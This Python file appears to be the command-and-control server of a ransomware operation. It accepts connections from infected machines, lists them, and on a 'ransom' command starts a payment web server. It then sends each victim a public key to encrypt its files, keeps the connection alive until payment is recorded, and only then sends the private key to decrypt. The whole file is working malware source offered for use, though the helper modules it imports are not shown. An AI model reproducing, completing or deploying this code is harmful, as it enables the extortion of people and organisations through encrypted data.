import socket
import threading
import globals
import time
import keygen
from cryptography.hazmat.primitives import serialization
import curses
import bus
import queue
import ransom
import payment

class Server:
    def __init__(self, bus: bus.Bus):
        # Create Socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.addr = "0.0.0.0"
        self.port = 8080
        self.running = False
        self.bus = bus
        self.line = 0
        self.connections = []
        self.targets = []
    
    def start(self):
        # Bind and Listen

        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.addr, self.port))
        self.sock.listen(5)
        self.running = True
        self.log(f"Server started on {self.addr}:{self.port}")
        
    def log(self, log: str):
        self.bus.log_queue.put(log)

    def run(self):
        # Wait for connections
        threading.Thread(target=self._command_loop, daemon=True).start()
        while self.running:
            conn, addr = self.sock.accept()
            self.bus.connections.append({addr: conn})
            self.log(f"Connection from {addr[0]}:{addr[1]}")
            t = threading.Thread(target=self.handle_client, args=(conn, addr,))
            t.start()

    def _command_loop(self):
        while self.running:
            try:
                cmd = self.bus.cmd_queue.get(timeout=0.1)
                match cmd:
                    case "list":
                        self.list_connections()
                    case "ransom":
                        self.ransomware()

            except queue.Empty:
                pass
                      
    def handle_client(self, conn: socket.socket, addr):
        try:
            self.log(f"Received data from {addr[0]}:{addr[1]}")
            # no close here at all — ransomware() owns the socket from here
        except Exception as e:
            self.log(f"Something went wrong with {addr[0]}:{addr[1]}: {e}")
            # only close on actual error
            conn.close()
            self.bus.connections = [c for c in self.bus.connections if list(c.keys())[0] != addr]

    def list_connections(self):
        if not self.bus.connections:
            self.log("No active connections")
            return
        for c in self.bus.connections:
            addr = list(c.keys())[0]
            self.log(f"{addr[0]}:{addr[1]}")

    def check_payment(self, conn):
        if globals.get_payment():
            self.send_key(conn)

    def send_key(self, conn):  
        with open("priv.pem", "r") as f:
            key = f.read()
        conn.send(key.encode())
        print("Sent private key")



### ATTACKS ###
    def ransomware(self):
        import logging
        logging.getLogger('werkzeug').setLevel(logging.ERROR)
        # Start Payment Thread
        payment_thread = threading.Thread(
            target=payment.app.run,
            kwargs={
                "host": "0.0.0.0",
                "port": 5000,
                "use_reloader": False,
                "debug": False
            }
        )
        payment_thread.daemon = True
        payment_thread.start()

        for target in self.bus.targets:
            for addr, conn in target.items():          
                # Get ready
                conn.send("RANSOM".encode())
                self.log(f"{addr} is waiting For READY")
                data = conn.recv(2048)
                if data.decode() == "READY":
                    self.log(f"{addr} is ready for attack!")
                    r = ransom.Ransom()
                    # After ready send public key
                    conn.send(r.serialize_public_key())
                    # Get Confirmation of encryption
                    confirm = conn.recv(2048)
                    self.log(f"{addr} is encrypted!")
                        
                    while not globals.get_payment():
                        # feed ransom nonsense to keep alive
                        conn.send("PING".encode())
                        conn.recv(2048)
                        time.sleep(1)
                        
                    conn.send("PAID".encode())
                    confirm = conn.recv(2048)
                    self.log(f"{addr} has payed!")
                    # After payment is completed
                    conn.send(r.serialize_private_key())
                    confirm = conn.recv(2048)  # wait for client DONE
                    self.log(f"{addr} decrypted successfully — ransom complete")
                else:
                    self.log(f"{addr} did not respond with READY, skipping")
        

    
